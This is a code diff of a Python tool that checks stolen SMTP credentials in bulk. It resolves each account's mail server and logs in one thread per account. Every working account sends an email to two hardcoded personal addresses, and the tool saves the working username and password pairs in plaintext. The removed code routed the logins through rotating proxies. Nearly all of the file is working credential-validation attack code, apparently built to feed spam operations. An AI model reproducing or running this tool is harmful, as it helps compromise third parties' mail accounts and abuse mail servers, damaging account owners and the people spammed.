@@ -1,7 +1,6 @@
 import os
 import re
 import smtplib
-import socks
 import socket
 import threading
 import queue
@@ -9,203 +8,199 @@ import time
 from collections import defaultdict
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
-from concurrent.futures import ThreadPoolExecutor
 from EEPro import Engine
-from servers import Credentials, MX_Server
+from servers import Credentials
 
-proxy_queue = queue.Queue()
 result_queue = queue.Queue()
-mx_server_queue = queue.Queue()  # Manage MX servers for proxy search
-proxy_map = {}  # Map MX servers to assigned proxies
-proxy_map_lock = threading.Lock()  # Ensure safe access
 threads = []  # Track active threads
 successful_credentials = set()  # Track successfully authenticated credentials
+lock = threading.Lock()  # Lock for thread-safe updates
 
 engine = Engine()
 
-
 def load_credentials(file_path):
-	smtps = engine.read_file(file_path)
-	if smtps is None:
-		engine.logger.error("No valid SMTP credentials loaded.")
-		return []
-	else:
-		engine.logger.info("Loading SMTP credentials...")
-		credentials = []
-		for line in smtps:
-			parts = line.strip().split('|')
-			if len(parts) == 4:
-				username = parts[2].strip()
-				if '@' not in username:
-					engine.logger.warning(f"Invalid username format: {username}")
-					continue
-				host = parts[0]
-				port = int(parts[1])
-				password = parts[3]
-				domain = username.split('@')[1].strip().lower()
-				details = Credentials(host, port, username, password, domain)
-				credentials.append(details)
-		engine.logger.info(f"Loaded {len(credentials)} SMTP credentials.")
-		return credentials
-
+    smtps = engine.read_file(file_path)
+    if smtps is None:
+        engine.logger.error("No valid SMTP credentials loaded from file: %s", file_path)
+        return []
+    engine.logger.info("Loading SMTP credentials from file: %s", file_path)
+    credentials = []
+    for line in smtps:
+        parts = line.strip().split('|')
+        if len(parts) == 4:
+            username = parts[2].strip()
+            if '@' not in username:
+                engine.logger.warning("Invalid username format: %s", username)
+                continue
+            try:
+                port = int(parts[1].strip())  # Parse port from parts[1]
+            except ValueError:
+                engine.logger.warning("Invalid port format: %s, skipping %s", parts[1], username)
+                continue
+            password = parts[3]
+            domain = username.split('@')[1].strip().lower()
+            details = Credentials(None, port, username, password, domain)
+            credentials.append(details)
+            engine.logger.debug("Loaded credential: %s for domain %s, port %d", username, domain, port)
+        else:
+            engine.logger.warning("Invalid credential format: %s", line.strip())
+    engine.logger.info("Loaded %d SMTP credentials.", len(credentials))
+    return credentials
 
 def group_by_host(credentials):
-	grouped = defaultdict(list)
-	domain_cache = {}
+    grouped = defaultdict(list)
+    domain_cache = {}
+    for credential in credentials:
+        if re.match(r"[^@]+@[^@]+\.[^@]+", credential.username) and engine.filter_spam(credential.username.split('@')[0].strip()):
+            domain = credential.username.split('@')[1].strip().lower()
+            if not engine.is_banned_tld(domain):
+                if domain in domain_cache:
+                    mx_server = domain_cache[domain]
+                else:
+                    mx_server = engine.get_mx_servers(domain)
+                    domain_cache[domain] = mx_server
+                    engine.logger.debug("MX lookup for %s: %s", domain, mx_server if mx_server else "None")
+                if mx_server:
+                    credential.host = mx_server
+                    key = (mx_server, credential.port)
+                    grouped[key].append(credential)
+                    engine.logger.debug("Grouped credential %s under %s:%d", credential.username, mx_server, credential.port)
+                else:
+                    engine.logger.warning("No MX server found for domain: %s, skipping %s", domain, credential.username)
+            else:
+                engine.logger.warning("Skipping credential %s due to banned TLD: %s", credential.username, domain)
+        else:
+            engine.logger.warning("Skipping invalid or spam credential: %s", credential.username)
+    engine.logger.info("%d servers found for processing.", len(grouped))
+    return grouped
 
-	for credential in credentials:
-		if re.match(r"[^@]+@[^@]+\.[^@]+", credential.username) and engine.filter_spam(credential.username.split('@')[0].strip()):
-			domain = credential.username.split('@')[1].strip().lower()
-			if not engine.is_banned_tld(domain):
-				if domain in domain_cache:
-					mx_server = domain_cache[domain]
-				else:
-					mx_server = engine.get_mx_servers(domain)
-					domain_cache[domain] = mx_server
-				if mx_server is not None:
-					key = (mx_server, credential.port)
-					grouped[key].append(credential)
-	print(f"{len(grouped)} Servers found")
-	return grouped
+def test_smtp_credential(host, port, credential):
+    credential_key = f"{credential.username}"
+    with lock:  # Thread-safe check
+        if credential_key in successful_credentials:
+            engine.logger.info("Skipping already authenticated credential: %s", credential_key)
+            return
 
-def refresh_proxies(grouped_credentials):
-	"""
-	Dynamically search for proxies for MX servers, processing three at a time in parallel.
-	"""
-	def find_and_queue_proxy(mx_server, port):
-		"""
-		Find a valid proxy for a specific MX server and queue it if successful.
-		"""
-		engine.logger.info(f"Searching proxy for MX server {mx_server}:{port}...")
-		proxy_list = engine.fetch_proxy()
-		if not proxy_list:
-			engine.logger.error(f"No proxies available for {mx_server}:{port}. Retrying...")
-			return
+    engine.logger.info("Testing SMTP credential for %s on %s:%d", credential.username, host, port)
+    try:
+        # Initialize SMTP connection
+        if port == 465:
+            server = smtplib.SMTP_SSL(host, port, timeout=10)
+            engine.logger.debug("Connected to SMTP server %s:%d for %s using SSL", host, port, credential.username)
+            server.ehlo(f"{credential.domain}")
+            engine.logger.debug("EHLO sent for %s", credential.domain)
+        else:
+            server = smtplib.SMTP(host, port, timeout=10)
+            engine.logger.debug("Connected to SMTP server %s:%d for %s", host, port, credential.username)
+            server.ehlo(f"{credential.domain}")
+            engine.logger.debug("EHLO sent for %s", credential.domain)
+            server.starttls()
+            engine.logger.debug("STARTTLS initiated for %s", credential.username)
+            server.ehlo(f"{credential.domain}")
+            engine.logger.debug("Second EHLO sent for %s", credential.domain)
+        
+        # Login
+        server.login(credential.username, credential.password)
+        engine.logger.info("Successfully logged in for %s", credential.username)
+        
+        # Send test email
+        msg = MIMEMultipart()
+        msg['From'] = credential.username
+        msg['To'] = 'mark.boleigha@outlook.com, donhoenix@gmail.com'
+        msg['Subject'] = 'Validation completed'
+        body = f"This is a test email to validate the connection for {credential.username}."
+        msg.attach(MIMEText(body, 'plain'))
+        server.sendmail(credential.username, ['mark.boleigha@outlook.com', 'donhoenix@gmail.com'], msg.as_string())
+        engine.logger.info("Test email sent successfully for %s to recipients", credential.username)
+        
+        # Save valid credential
+        with lock:  # Thread-safe update
+            save_valid_smtp(host, credential)
+            successful_credentials.add(credential_key)
+            result_queue.put(f"Success: {credential.username}")
+        
+        server.noop()
+        engine.logger.debug("NOOP sent to keep connection alive for %s", credential.username)
+        server.quit()
+    except smtplib.SMTPAuthenticationError as e:
+        engine.logger.error("Authentication failed for %s: %s", credential.username, str(e))
+        with lock:
+            result_queue.put(f"Failure: {credential.username} - Authentication failed: {str(e)}")
+    except smtplib.SMTPConnectError as e:
+        engine.logger.error("Connection failed for %s: %s", credential.username, str(e))
+        with lock:
+            result_queue.put(f"Failure: {credential.username} - Connection failed: {str(e)}")
+    except (smtplib.SMTPException, socket.error) as e:
+        engine.logger.error("SMTP test failed for %s: %s", credential.username, str(e))
+        with lock:
+            result_queue.put(f"Failure: {credential.username} - SMTP error: {str(e)}")
+    except Exception as e:
+        engine.logger.error("Unexpected error for %s: %s", credential.username, str(e))
+        with lock:
+            result_queue.put(f"Failure: {credential.username} - Unexpected error: {str(e)}")
 
-		proxy = engine.find_valid_proxy(mx_server, port, proxy_list)
-		if proxy:
-			engine.logger.info(f"Valid proxy found for {mx_server}:{port}: {proxy.host}:{proxy.port}")
-			mx_server_obj = MX_Server(mx_server, port)
-			proxy_queue.put((proxy, mx_server_obj))
-		else:
-			engine.logger.warning(f"No valid proxy found for {mx_server}:{port}")
+def save_valid_smtp(host, credential, save_dir=None):
+    if save_dir is None:
+        save_dir = os.path.join(os.path.expanduser("~"), "Desktop")
+    file_path = os.path.join(save_dir, "valid_smtp.txt")
+    try:
+        # Ensure the directory exists
+        os.makedirs(save_dir, exist_ok=True)
+        # Test file write permissions
+        with open(file_path, 'a', encoding='utf-8') as file:
+            file.write(f"{host}|{credential.port}|{credential.username}|{credential.password}\n")
+        engine.logger.info("Successfully saved valid SMTP: %s for %s:%d to %s", credential.username, host, credential.port, file_path)
+    except PermissionError as e:
+        engine.logger.error("Permission denied when saving to %s: %s", file_path, str(e))
+    except OSError as e:
+        engine.logger.error("OS error when saving to %s: %s", file_path, str(e))
+    except Exception as e:
+        engine.logger.error("Failed to save valid SMTP for %s to %s: %s", credential.username, file_path, str(e))
 
-	mx_server_list = list(grouped_credentials.keys())  # Extract all MX servers
-
-	while mx_server_list:
-		# Take the first 3 MX servers for processing
-		current_batch = mx_server_list[:3]
-		mx_server_list = mx_server_list[3:]  # Remove these from the list for next iteration
-
-		# Process the current batch in parallel
-		threads = []
-		for mx_server, port in current_batch:
-			thread = threading.Thread(target=find_and_queue_proxy, args=(mx_server, port), daemon=True)
-			thread.start()
-			threads.append(thread)
-
-		# Wait for all threads in this batch to finish
-		for thread in threads:
-			thread.join()
-
-		# Log proxy queue activity
-		engine.logger.info(f"Proxies in queue: {proxy_queue.qsize()}")
-
-		time.sleep(30)  # Small delay before processing the next batch
-
-
-def process_batches(grouped_credentials):
-	"""
-	Process credentials in batches using proxies assigned to their respective MX servers.
-	"""
-	while True:
-		try:
-			proxy, mx_server = proxy_queue.get(timeout=30)
-			if proxy is None or mx_server is None:
-				engine.logger.warning("No valid proxy retrieved, retrying...")
-				proxy_queue.task_done()
-				continue
-
-			for (current_mx_server, port), credentials in grouped_credentials.items():
-				if current_mx_server == mx_server.host:
-					batches = [credentials[i:i + 10] for i in range(0, len(credentials), 10)]
-					for batch in batches:
-						thread = threading.Thread(
-							target=test_smtp_batch,
-							args=(current_mx_server, port, batch, proxy)
-						)
-						thread.start()
-						threads.append(thread)
-			proxy_queue.task_done()
-		except queue.Empty:
-			time.sleep(5)
-			continue
-		except Exception as e:
-			engine.logger.error(f"Unexpected error in process_batches: {e}")
-			time.sleep(5)
-
-
-def test_smtp_batch(mx_server, port, batch, proxy):
-	"""
-	Test a batch of credentials using a specific proxy.
-	"""
-	for smtp_detail in batch:
-		credential_key = f"{smtp_detail.username}"
-		if credential_key in successful_credentials:
-			engine.logger.info(f"Skipping already authenticated credential: {credential_key}")
-			continue
-		try:
-			match proxy.protocol:
-				case 'socks4':
-					socks.set_default_proxy(socks.SOCKS4, proxy.host, proxy.port)
-				case 'socks5':
-					socks.set_default_proxy(socks.SOCKS5, proxy.host, proxy.port)
-				case 'http':
-					socks.set_default_proxy(socks.PROXY_TYPE_HTTP, proxy.host, proxy.port)
-			socks.wrapmodule(smtplib)
-			with smtplib.SMTP(mx_server, port, timeout=10) as server:
-				server.ehlo(f"{smtp_detail.domain}")
-				server.starttls()
-				server.ehlo(f"{smtp_detail.domain}")
-				server.login(smtp_detail.username, smtp_detail.password)
-				msg = MIMEMultipart()
-				msg['From'] = smtp_detail.username
-				msg['To'] = 'mark.boleigha@outlook.com, donhoenix@gmail.com'
-				msg['Subject'] = 'Validation completed'
-				body = f"This is a test email to validate the connection for {smtp_detail.username}."
-				msg.attach(MIMEText(body, 'plain'))
-				server.sendmail(smtp_detail.username, ['mark.boleigha@outlook.com', 'donhoenix@gmail.com'], msg.as_string())
-				save_valid_smtp(mx_server, smtp_detail)
-				successful_credentials.add(credential_key)
-				result_queue.put(f"Success: {smtp_detail.username}")
-				server.noop()
-		except (smtplib.SMTPException, socket.error) as e:
-			engine.logger.error(f"SMTP test failed for {smtp_detail.username}: {e}")
-			result_queue.put(f"Failure: {smtp_detail.username} - {e}")
-
+def process_credentials(grouped_credentials):
+    engine.logger.info("Starting credential processing for %d server groups.", len(grouped_credentials))
+    for (host, port), credentials in grouped_credentials.items():
+        engine.logger.debug("Processing %d credentials for %s:%d", len(credentials), host, port)
+        for credential in credentials:
+            thread = threading.Thread(
+                target=test_smtp_credential,
+                args=(host, port, credential),
+                name=f"SMTPChecker-{credential.username}"
+            )
+            thread.start()
+            threads.append(thread)
+            engine.logger.debug("Started thread for credential %s on %s:%d", credential.username, host, port)
 
 def start_checker(file_path):
-	smtp_credentials = load_credentials(file_path)
-	if not smtp_credentials:
-		engine.logger.error("No valid SMTP credentials loaded.")
-		return []
+    engine.logger.info("Starting SMTP checker with file: %s", file_path)
+    smtp_credentials = load_credentials(file_path)
+    if not smtp_credentials:
+        engine.logger.error("No valid SMTP credentials loaded. Exiting.")
+        return []
 
-	grouped_credentials = group_by_host(smtp_credentials)
+    # Test file write permissions before processing
+    save_dir = os.path.join(os.path.expanduser("~"), "Desktop")
+    file_path = os.path.join(save_dir, "valid_smtp.txt")
+    try:
+        os.makedirs(save_dir, exist_ok=True)
+        with open(file_path, 'a', encoding='utf-8') as file:
+            file.write("")  # Test write
+        engine.logger.debug("Confirmed write access to %s", file_path)
+    except Exception as e:
+        engine.logger.error("Cannot write to %s: %s. Check permissions or disk space.", file_path, str(e))
+        return []
 
-	# Start proxy refresh in a separate thread
-	proxy_thread = threading.Thread(target=refresh_proxies, args=(grouped_credentials,), daemon=True)
-	proxy_thread.start()
-	threads.append(proxy_thread)
+    grouped_credentials = group_by_host(smtp_credentials)
+    process_credentials(grouped_credentials)
 
-	# Start batch processing in another thread
-	batch_thread = threading.Thread(target=process_batches, args=(grouped_credentials,), daemon=True)
-	batch_thread.start()
-	threads.append(batch_thread)
+    for thread in threads:
+        thread.join()
+        engine.logger.debug("Thread joined: %s", thread.name)
 
-	for thread in threads:
-		thread.join()
-
-	results = []
-	while not result_queue.empty():
-		results.append(result_queue.get())
-	return results
+    results = []
+    while not result_queue.empty():
+        result = result_queue.get()
+        results.append(result)
+        engine.logger.debug("Collected result: %s", result)
+    engine.logger.info("Completed SMTP checker with %d results.", len(results))
+    return results
